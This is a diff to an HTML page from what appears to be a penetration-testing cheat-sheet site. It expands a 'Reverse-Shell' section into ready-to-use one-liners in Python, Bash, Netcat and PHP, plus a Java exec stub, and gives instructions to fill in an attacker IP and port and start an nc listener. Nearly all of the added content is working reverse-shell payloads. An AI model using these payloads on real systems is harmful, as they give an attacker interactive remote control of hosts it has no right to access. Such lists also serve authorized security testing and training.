@@ -136,6 +136,10 @@
                     
     <a class="" href="../git/">Git</a>
                 </li>
+                <li class="">
+                    
+    <a class="" href="../jwt/">JWT</a>
+                </li>
     </ul>
 	    </li>
           
@@ -197,6 +201,14 @@
         
             <li><a class="toctree-l4" href="#python">Python</a></li>
         
+            <li><a class="toctree-l4" href="#bash">Bash</a></li>
+        
+            <li><a class="toctree-l4" href="#netcat">Netcat</a></li>
+        
+            <li><a class="toctree-l4" href="#java">Java</a></li>
+        
+            <li><a class="toctree-l4" href="#php">PHP</a></li>
+        
         </ul>
     
 
@@ -246,9 +258,30 @@
             <div class="section">
               
                 <h1 id="reverse-shell">Reverse-Shell</h1>
-<p>A list of reverse-shell</p>
+<p>A list of Reverse Shells on multiple languages. Replace <code>{IP}</code> and <code>{PORT}</code> values
+with a couple <code>IP:port</code> the server can access. Then, on your local machine you open
+a listener with <code>netcat</code>:</p>
+<pre><code class="bash">nc -lvnp {PORT}
+</code></pre>
+
 <h2 id="python">Python</h2>
 <pre><code class="bash">python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;{IP}\\&quot;,{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);\'
+</code></pre>
+
+<h2 id="bash">Bash</h2>
+<pre><code class="bash">bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1
+</code></pre>
+
+<h2 id="netcat">Netcat</h2>
+<pre><code class="bash">nc -e /bin/sh {IP} {PORT}
+</code></pre>
+
+<h2 id="java">Java</h2>
+<pre><code class="java">r = Runtime.getRuntime();p = r.exec([&quot;your payload&quot;] as String[]);p.waitFor()
+</code></pre>
+
+<h2 id="php">PHP</h2>
+<pre><code class="bash">php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
 </code></pre>
               
             </div>
